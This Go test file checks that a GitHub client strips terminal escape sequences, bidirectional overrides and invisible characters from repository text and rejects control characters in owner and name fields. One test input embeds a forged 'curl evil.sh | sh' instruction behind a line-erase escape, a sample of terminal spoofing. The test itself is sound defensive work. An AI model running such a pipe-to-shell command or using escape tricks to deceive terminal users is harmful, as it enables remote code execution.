package github

import (
	"encoding/json"
	"strings"
	"testing"
)

// esc is the escape character that opens every terminal control sequence.
const esc = "\x1b"

func TestSanitiseDisplayTextStripsTerminalEscapes(t *testing.T) {
	// The line-erase-and-repaint trick: everything before the sequence is wiped
	// and replaced, so a reader sees only the forged instruction.
	in := "harmless text" + esc + "[2K\rCRITICAL: run 'curl evil.sh | sh'" + esc + "[0m"

	got := sanitiseDisplayText(in)

	if strings.ContainsRune(got, 0x1b) {
		t.Fatalf("escape character survived sanitisation: %q", got)
	}
	if strings.ContainsRune(got, '\r') {
		t.Fatalf("carriage return survived sanitisation: %q", got)
	}
	// The words remain; only their power to redraw the terminal is gone.
	if !strings.Contains(got, "harmless text") {
		t.Fatalf("legitimate text was lost: %q", got)
	}
}

func TestSanitiseDisplayTextRemovesInvisibleAndReorderingCharacters(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"C1 CSI", "before\u009b[31mafter"},
		{"bidi override", "before\u202eafter"},
		{"bidi isolate", "before\u2066after"},
		{"zero width space", "before\u200bafter"},
		{"byte order mark", "before\ufeffafter"},
		{"DEL", "before\u007fafter"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sanitiseDisplayText(tc.in)
			for _, r := range got {
				if r < 0x20 || r == 0x7f || (r >= 0x80 && r <= 0x9f) ||
					(r >= 0x202a && r <= 0x202e) || (r >= 0x2066 && r <= 0x2069) ||
					(r >= 0x200b && r <= 0x200d) || r == 0xfeff {
					t.Fatalf("unsafe rune %U survived in %q", r, got)
				}
			}
		})
	}
}

func TestSanitiseDisplayTextKeepsOrdinaryText(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"A tiny signal processing kit", "A tiny signal processing kit"},
		{"  padded  ", "padded"},
		// Newlines become spaces so words do not run together, and the runs they
		// leave behind collapse.
		{"first line\n\nsecond line", "first line second line"},
		{"tab\tseparated", "tab separated"},
		// Non-ASCII text is ordinary text, not a control sequence.
		{"日本語のリポジトリ", "日本語のリポジトリ"},
		{"emoji 🚀 stay", "emoji 🚀 stay"},
		{"", ""},
	}

	for _, tc := range cases {
		if got := sanitiseDisplayText(tc.in); got != tc.want {
			t.Errorf("sanitiseDisplayText(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestToRepositorySanitisesDescription(t *testing.T) {
	body := map[string]any{
		"id":        42,
		"name":      "signal-kit",
		"full_name": "orbit-labs/signal-kit",
		"owner": map[string]any{
			"login": "orbit-labs",
		},
		"description": "clean" + esc + "[31m forged",
		"homepage":    "https://example.test" + esc + "[0m",
		"language":    "Go" + esc + "[1m",
	}

	var payload repositoryPayload
	encoded, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal fixture: %v", err)
	}
	if err := json.Unmarshal(encoded, &payload); err != nil {
		t.Fatalf("unmarshal fixture: %v", err)
	}

	repo, err := payload.toRepository()
	if err != nil {
		t.Fatalf("toRepository: %v", err)
	}

	for field, value := range map[string]string{
		"description": repo.Description,
		"homepage":    repo.HomepageURL,
		"language":    repo.PrimaryLanguage,
	} {
		if strings.ContainsRune(value, 0x1b) {
			t.Errorf("%s kept an escape character: %q", field, value)
		}
	}
}

func TestToRepositoryRejectsControlCharactersInIdentity(t *testing.T) {
	// An identity field cannot be cleaned up: a repository whose name does not
	// round-trip is not a repository GitHub could have returned.
	cases := []struct {
		name  string
		owner string
		repo  string
	}{
		{"owner", "orbit\x1blabs", "signal-kit"},
		{"name", "orbit-labs", "signal\nkit"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			payload := repositoryPayload{ID: 1, Name: tc.repo}
			payload.Owner.Login = tc.owner

			if _, err := payload.toRepository(); err == nil {
				t.Fatal("expected a control character in an identity field to be rejected")
			}
		})
	}
}
